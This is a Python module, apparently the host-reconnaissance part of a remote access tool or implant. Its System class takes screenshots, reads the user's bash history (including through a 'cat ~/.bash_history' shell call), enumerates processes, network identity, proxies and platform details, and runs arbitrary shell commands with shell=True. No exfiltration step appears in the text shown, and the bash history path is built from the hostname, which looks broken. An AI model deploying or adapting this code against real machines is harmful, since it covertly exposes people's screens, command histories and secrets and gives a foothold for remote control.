# Used for detecting our system's environment and details.
import platform
# Used to exeute subprocesses & system calls.
import subprocess
# Used for getting the MAC address.
from getmac import get_mac_address

# Networking.
import socket

# Listing of running processes.
import psutil

# Getting of proxy settings.
from urllib.request import getproxies

import logging

# Used for screenshoots.
import pyscreenshot

class System:
  # Details regarding the running machine.
  the_machine: dict = {}

  # Take a screenshot.
  # Works on OSX & Windows.
  def screen_image(self):
    logging.debug('[+] Getting a screenshoot.')
    try:
      return pyscreenshot.grab()
    except Exception as e:
      logging.debug('[-] Unable to grab an screen image:')
      logging.debug(e)
      pass

  # Returns the bash history through shell call.
  @staticmethod
  def get_bash_history_cat() -> str:
    return System.do('cat ~/.bash_history')

  # Returns the bash history for a current user.
  @staticmethod
  def bash_history() -> list:
    logging.debug('[*] Getting the bash history.')
    try:
      with open('/home/' + socket.gethostname() + '/.bash_history') as f:
        return f.readlines()
    except Exception as e:
      logging.debug('[-] Failed to get bash history:')
      logging.debug(e)
      return []

  # Grabs system level proxy settings from our system.
  @staticmethod
  def system_proxy_settings() -> dict:
    logging.debug('[*] Getting system level proxy settings.')
    return getproxies()
  
  # Enumerate processes and return their pid, name, and cpu usage.
  @staticmethod
  def enumerate_running_processes() -> list:
    logging.debug('Getting the list of running processes.')

    processes: list = []

    for process in psutil.process_iter():
      process_object: dict = process.as_dict(attrs = [
        'pid',
        'name',
        'cpu_percent'
      ])
      processes.append(process_object)

    return processes

  # Get basic information about the local network environment.
  @staticmethod
  def enumerate_local_host() -> dict:
    logging.debug('[*] Getting information about local network environment.')

    local_env: dict = {}

    # Name of our host.
    local_env['name'] = socket.gethostname()

    # Local internet address of our host,
    # if it failes to find it,
    # something like "127.0.0.1" will be returned.
    local_env['address'] = socket.gethostbyname(local_env['name'])

    # Mac address of our host.
    local_env['mac'] = get_mac_address()

    return local_env

  # Execute a command onto the system.
  @staticmethod
  def do(command: str) -> str:
    logging.info('[+] Executing subprocess call: ' + command)

    try:
      return subprocess.check_output(
        command,
        shell = True
      ).decode('utf-8')
    except Exception as e:
      logging.debug('[-] Failed to execute a system command.')
      logging.debug(e)
      return ''

  # Identifies host's environment and returns it.
  @staticmethod
  def environment_details() -> dict:
    logging.debug('[*] Grabing the local environment.')

    return {
      'system': platform.system(),
      'machine': platform.machine(),
      'platform': platform.platform(),
      'uname': platform.uname(),
      'version': platform.version(),
      'mac_ver': platform.mac_ver()
    }